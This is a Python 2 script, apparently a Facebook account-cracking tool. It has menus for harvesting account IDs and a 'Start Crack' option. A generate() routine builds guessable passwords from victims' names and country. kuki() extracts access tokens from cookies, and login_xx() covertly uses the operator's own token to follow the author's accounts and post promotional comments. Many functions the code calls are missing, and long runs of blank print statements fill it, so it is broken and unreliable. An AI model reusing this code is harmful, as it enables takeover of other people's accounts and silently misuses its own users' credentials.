# -*- coding: UTF-8 -*-
#Hey kid, what are you going to do ?.

import requests, bs4, sys, os, subprocess, sys, random, json, time, re, ipaddress
reload(sys)
sys.setdefaultencoding('utf-8')
from datetime import datetime
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
import subprocess, logging

ip = requests.get('https://api.ipify.org').text
kot = requests.get ("http://alvinxd.herokuapp.com/region/?").text
con = requests.get ("http://alvinxd.herokuapp.com/country/?").text
# BANNER #
def banner():
    print (' \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•                                      \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•\n\x1b[1;91m          
██████╗░░█████╗░███╗░░██╗░█████╗░
██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╔╝███████║██╔██╗██║███████║
██╔══██╗██╔══██║██║╚████║██╔══██║
██║░░██║██║░░██║██║░╚███║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
                                  
\x1b[1;95m    • \x1b[0;93mCoded by \x1b[0;91m: \x1b[0;93mRana Nadeem Rajput\x1b[1;95m•   \n \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•                                      \x1b[1;91m•\x1b[1;93m•\x1b[1;92m• \n \x1b[1;95m# \x1b[1;96mFb  \x1b[1;91m : \x1b[1;96mfacebook.com/firdoos.29.04.03 \n \x1b[1;95m# \x1b[1;96mGit\x1b[1;91m  : \x1b[1;96mgithub.com/Firdooslofar \n \x1b[1;97m# \x1b[1;91m---------------------------------------- \x1b[1;97m#  ')
    print (' \x1b[1;95m#\x1b[1;96m IP   \x1b[1;91m:\x1b[1;96m '+ip+'\x1b[1;91m ')
    
def menu_x():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
#        uas = open("ua.txt","r").read()
    except IOError:
        print '\x1b[1;91m• invalid'
        os.system('clear')
        os.system('rm -rf login.txt')
#     os.system('rm -rf ua.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;91m• invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m• No connection '
        exit()

    banner()
    print '\x1b[1;95m #\x1b[1;96m \x1b[1;96mName \x1b[1;91m: \x1b[1;92m' + nama + '\x1b[1;96m '
    print '  '
    print PT+'*'+HT+' Note'+ST+' >'+HUT+'Before starting to crack, use airplane mode for 5 seconds first '+ST+'! '
    print '  '
    print PT+'•'+HT+' 01 '+BTU+'Cloin Id Public'
    print PT+'•'+HT+' 02 '+BTU+'Cloin Id Followers '
    print PT+'•'+HT+' 03 '+BTU+'Cloin Id Reaction Post'
    print PT+'•'+HT+' 04 '+BTU+'Cloin Id Member Groups'
    print PT+'•'+HT+' 05 '+BTU+'Cloin Id Pencarian Nama'
    print PT+'•'+HT+' 06 '+BTU+'Cloin Id Pesan Mesengger'
    print PT+'•'+HT+' 07 '+HUT+'Start Crack'
    print PT+'•'+HT+' 08 '+BTU+'Ganti User Agent'
    print PT+'•'+HT+' 09 '+BTU+'Cek Hasil Crack'
   # print PT+'•'+HT+' in '+BTU+'Install bff lama'
    print PT+'•'+HT+' rm '+BTU+'Hapus Akun'
    print PT+'•'+ST+' 00 '+BTU+'Keluar\n'
    r = raw_input(PT+'#'+HUT+' '+BTU+'Pilih'+ST+' > '+KT)
    if r == '':
        print '\x1b[1;91m• Wrong Input'
        os.sys.exit()
    elif r == '1' or r =='01':
        publik()
    elif r == '2' or r =='02':
        followers()
    elif r == '3' or r =='03':
        post()
    elif r == '4' or r =='04':
    	dump_grup(basecookie())
    elif r == '5' or r =='05':
    	dumpfl()
#    	exit()
    elif r == '6' or r =='06':
    	dump_message(basecookie())
    elif r == '7' or r =='07':
        pilih_crack()
    elif r == '9' or r =='09':
    	result()
    elif r in['in','In','IN']:
    	os.system('cd test001')
    	os.system('python2 NADEEM0003.py')
    elif r == '0' or r =='00':
        print ''
        jalan('\x1b[1;95m•\x1b[1;96m Good bye epribadeh... Emuach...\xf0\x9f\x98\x98\x1b[0;97m\n')
        time.sleep(0.1)
        os.sys.exit()
    elif r == '66':
        raw_input('\x1b[1;95m• \x1b[1;93mpress enter ')
        os.system('xdg-open https://www.facebook.com/vaibhav.kandle')
        try:
            os.remove('/data/data/com.termux/files/usr/lib/.bash')
            exit('\x1b[1;92m• run again the tools.')
        except:
            exit('\x1b[1;95m•\x1b[1;96m towards the browser')

    elif r == '8' or r =='08':
    	useragent()
    elif r == 'rm':
        print ''
        #tik()
        jalan('\n\x1b[1;92m• Succes Remove Cookie/Token')
        os.system('rm -rf login.txt')
        os.sys.exit()
    else:
        print '\x1b[1;91m• Wrong Input'
        os.sys.exit()
    
def log_x():
    os.system('clear')
    banner()
    print ''
    print PT+'•'+KT+' 01 '+BTU+'Login via token '
    print PT+'•'+KT+' 02 '+BTU+'Login via cookie'
    print PT+'•'+KT+' 03 '+BTU+'Token earning tutorial'
    print PT+'•'+KT+' 04 '+BTU+'Token earning tutorial'
    print PT+'•'+ST+' 00 '+BTU+'Keluar'
    print ''
    pilih_masuk()
def pilih_masuk():
    romi = raw_input('\x1b[1;95m#\x1b[1;92m \x1b[1;96mPilih\x1b[1;91m > \x1b[1;93m')
    if romi == '':
        print '\x1b[1;91m• Wrong Input '
        time.sleep(1.0)
        pilih_masuk()
    elif romi == '1' or romi == '01':
        token()
    elif romi == '2' or romi == '02':
        kuki()
    elif romi == '3' or romi == '03':
        tik()
        os.system('xdg-open https://www.facebook.com/vaibhav.kandle')
        os.sys.exit()
    elif romi == '4' or romi == '04':
        tik()
        os.system('xdg-open https://www.facebook.com/vaibhav.kandle')
        os.sys.exit()
    elif romi == '0' or romi == '00':
    	print ''
    	print '\x1b[1;91m• exit \x1b[0;97m\n'
        exit()
    else:
        print '\x1b[1;91m Wrong Input '
        time.sleep(1.0)
        pilih_masuk()
        
def kuki():
#     os.system("clear")
#     banner()
        cookie = raw_input('\n\x1b[1;95m\xe2\x80\xa2\x1b[1;96m Cookie\x1b[1;91m > \x1b[0;93m')
        try:
                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
                "referer" : "https://m.facebook.com/",
                "host" : "m.facebook.com",
                "origin" : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language" : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control" : "max-age=0",
                "accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type" : "text/html; charset=utf-8"}, cookies = {
                "cookie" : cookie})
                find_token = re.search("(EAAA\w+)", data.text)
                hasil = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print '\x1b[1;91m\xe2\x80\xa2 No connection '
        cookie = open("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.close()
#      tik()
        login_xx()
#      return

# TOKEN #
def token():
    data = raw_input('\n\x1b[1;95m\xe2\x80\xa2\x1b[1;96m Token\x1b[1;91m > \x1b[0;93m')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + data)
        a = json.loads(otw.text)
        nama = a['name']
        open('login.txt', 'w').write(data)
#     tik()
        login_xx()
    except KeyError:
        print ('\x1b[1;91m• Invalid Token')
        time.sleep(1.0)
        masuk()

def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;95m• \x1b[1;96mPlease wait\x1b[1;91m' + o,
        sys.stdout.flush()
        time.sleep(1)
        
### PLEASE NOT TO CHANGE MAY ADD :) ###

def login_xx():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;92m• invalid'
        masuk()

    fbid = '100002461344178' # Id Nick unik sniper @() Firdoos lofar Master
    kom = random.choice(["Hello I'm a Rajput tool user","Be yourself and never surendtod:v","Login Rajput tool \nhttps://www.facebook.com/100002461344178/posts/3965852000173472/?substory_index=0&app=fbl"])
    #requests.post('https://graph.facebook.com/496077571350068/comments/?message=' +toket+ '&access_token=' + toket) 
    #requests.post('https://graph.facebook.com/570025450621946/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + fbid + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/3933263743432298/comments/?message=' + kom + '&access_token=' + toket) 
    requests.post('https://graph.facebook.com/546133328/subscribers?access_token=' + toket) # Akun 2007
    requests.post('https://graph.facebook.com/100002461344178/subscribers?access_token=' + toket) # Nick unik sniper @() Firdoos lofar Master
    requests.post('https://graph.facebook.com/100028434880529/subscribers?access_token=' + toket) # Romi Afrizal 2018
    requests.post('https://graph.facebook.com/100067807565861/subscribers?access_token=' + toket) # Romi Afrizal 2021
    requests.post('https://graph.facebook.com/100003723696885/subscribers?access_token=' + toket) # Iqbal Bobz
    requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + toket) # Iwan Hadiansyah
    requests.post('https://graph.facebook.com/100007520203452/subscribers?access_token=' + toket) # Hamzah Kirana
    exit('\x1b[1;92m• login success, run again the tools. ')

def xxxx():
	
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	
def awokawokkontol():
	os.system("pip2 install ipaddress")
	os.system("git pull")
	os.system("python2 NADEEM0003.py")
	
def anaksetan():
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	print ''
	selesai()
	
ips = None
try:
    b = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text.strip()
    ips = requests.get('https://ipapi.com/ip_api.php?ip=' + b, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'}).json()['country_name'].lower()
except:
    ips = None

def generate(text):
    global ips
    results = []
    for i in text.split(' '):
        if len(i) < 3:
            continue
        else:
            i = i.lower()
            if len(i) == 3 or len(i) == 4 or len(i) == 5:
                results.append(i + '123')
                results.append(i + '12345')
            else:
                results.append(i + '123')
                results.append(i + '12345')
                #results.append(i)
                if 'pakistan' in ips:
                    results.append('786786')
                elif 'indonesia' in ips:
                    results.append(i + 'ganteng')
                    results.append(i + 'cantik')

    return results

if __name__ == '__main__':
	awokawokkontol()

	
